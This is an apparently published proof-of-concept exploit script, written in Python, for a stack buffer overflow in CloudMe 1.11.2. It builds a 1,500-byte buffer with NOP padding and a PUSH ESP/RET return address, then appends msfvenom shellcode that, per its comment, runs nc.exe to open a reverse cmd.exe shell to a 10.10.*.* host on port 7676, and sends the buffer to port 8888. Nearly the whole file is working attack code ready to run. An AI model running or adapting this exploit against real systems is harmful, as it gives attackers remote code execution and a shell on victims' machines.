# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

# msfvenom -a x86 -p windows/exec CMD="C:\xampp\htdocs\gym\upload\nc.exe 10.10.*.* 7676 -e cmd.exe" -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xd9\xd0\xbb\xa5\xd7\x3b\xe9\xd9\x74\x24\xf4\x5a\x29"
payload += b"\xc9\xb1\x3e\x31\x5a\x19\x03\x5a\x19\x83\xea\xfc\x47"
payload += b"\x22\xc7\x01\x05\xcd\x38\xd2\x69\x47\xdd\xe3\xa9\x33"
payload += b"\x95\x54\x19\x37\xfb\x58\xd2\x15\xe8\xeb\x96\xb1\x1f"
payload += b"\x5b\x1c\xe4\x2e\x5c\x0c\xd4\x31\xde\x4e\x09\x92\xdf"
payload += b"\x81\x5c\xd3\x18\xff\xad\x81\xf1\x74\x03\x36\x75\xc0"
payload += b"\x98\xbd\xc5\xc5\x98\x22\x9d\xe4\x89\xf4\x95\xbf\x09"
payload += b"\xf6\x7a\xb4\x03\xe0\x9f\xf0\xda\x9b\x54\x8f\xdc\x4d"
payload += b"\xa5\x70\x72\xb0\x09\x83\x8a\xf4\xae\x7b\xf9\x0c\xcd"
payload += b"\x06\xfa\xca\xaf\xdc\x8f\xc8\x08\x97\x28\x35\xa8\x74"
payload += b"\xae\xbe\xa6\x31\xa4\x99\xaa\xc4\x69\x92\xd7\x4d\x8c"
payload += b"\x75\x5e\x15\xab\x51\x3a\xce\xd2\xc0\xe6\xa1\xeb\x13"
payload += b"\x49\x1e\x4e\x5f\x64\x4b\xe3\x02\xe3\x8a\x71\x39\x41"
payload += b"\x8c\x89\x42\xf6\xe4\xb8\xc9\x99\x73\x45\x18\xde\x8b"
payload += b"\x0f\x01\x77\x03\xd6\xd3\xc5\x4e\xe9\x09\x09\x76\x6a"
payload += b"\xb8\xf2\x8d\x72\xc9\xf7\xca\x34\x21\x8a\x43\xd1\x45"
payload += b"\x39\x64\xf0\x05\x87\xc6\x83\xe8\x9a\x86\x03\xb7\x0c"
payload += b"\x12\x80\x28\xae\xa9\x14\xd0\x49\x20\xf9\x6b\xda\xd6"
payload += b"\x6e\xf5\x7e\x7a\x1f\x96\x50\xe7\xa7\x3d\x8d\xd6\x67"
payload += b"\x90\xfc\x28\xa6\xdd\xca\x66\x84\x28\x13\x41\xde\x65"
payload += b"\x65\x8d\x33\xef\xa9\xae\x26\x8b\x87\x55\xc1\x36\xd8"


overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))	

buf = padding1 + EIP + NOPS + payload + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)